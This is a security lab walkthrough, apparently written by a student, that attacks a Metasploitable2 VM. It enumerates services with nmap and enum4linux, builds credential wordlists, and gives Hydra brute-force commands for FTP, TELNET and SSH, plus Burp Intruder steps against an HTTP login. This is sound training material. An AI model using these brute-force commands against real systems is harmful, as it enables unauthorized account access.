# 🛡️ Network Protocol Vulnerability Lab - Walkthrough

## 📌 Objective
The purpose of this lab is to simulate brute force attacks against common network services (**FTP**, **TELNET**, **SSH**, and **HTTP**), analyze the security of these protocols, capture and inspect network traffic, and propose security mitigations.

---

## 🖥️ Lab Environment Setup
- **Attacker VM:** Kali Linux 2024.4
- **Target VM:** Vulnerable Linux VM (Metasploitable2 / custom)
- **Tools Used:** Hydra, Burp Suite, Wireshark,

---

# 🧾 Task 1: Enumerate the Target

## 🎯 Goal
Identify valid usernames on the target VM.

## 1.1 Nmap scan
Performed an initial scan to discover open services.

---

## 🛠️ Commands Used
```bash
nmap -p 21,23,22,80 <target-ip> 
```

![image](https://github.com/user-attachments/assets/3003bcc5-bfd0-4b8f-b4e4-77baba25b8c5)

---

## 1.2 Enum4linux Enumeration
Since ports (21,23,22,80) are open, used enum4linux to gather more usernames.

---

## 🛠️ Commands Used
```bash
enum4linux -a <target-ip> 
```
![image](https://github.com/user-attachments/assets/d3aa5613-9725-45dc-9d5c-d2f50fb3ad5e)
![image](https://github.com/user-attachments/assets/2fd2d4d5-60fe-412f-b145-e07f3199bfc9)

---

# 🔐 Task 2: Brute Force Attacks

## ✅ Preparation

Before conducting brute-force attacks, prepare the following:

- **Username list** (`userlist.txt`)
- **Password list** (`passlist.txt`)

You can either:

- Use common lists available in Kali Linux, such as `/usr/share/wordlists/rockyou.txt`
- Or manually create a small custom list for testing:

```bash
echo -e "admin\nmsfadmin\nanonymous\nuser\ntest" > userlist.txt
echo -e "1234\nmsfadmin\nftp123\nadmin\npassword" > passlist.txt
```

---

## 2.1 FTP / TELNET / SSH
Use Hydra to perform brute force attacks against the services FTP, TELNET, and SSH.

---

## 🛠️ Example Hydra Commands

```bash
# Brute force FTP login
hydra -L /usr/share/wordlists/<file.txt> -P /usr/share/wordlists/<file.txt> ftp://<target-ip>

# Brute force TELNET login
hydra -L /usr/share/wordlists/<file.txt> -P /usr/share/wordlists/<file.txt> telnet://<target-ip>

# Brute force SSH login
hydra -L /usr/share/wordlists/<file.txt> -P /usr/share/wordlists/<file.txt> ssh://<target-ip>
```
![image](https://github.com/user-attachments/assets/3f148cad-802e-4a38-aa50-b542a588f5bd)

---

## 2.2 HTTP Login Page Attack (Burp Suite)
Steps:
- **Captured login request in Burp Proxy.**
- **Sent to Intruder.**
- **Configured payload positions for username and password.**
- **Loaded wordlists and launched attack.**
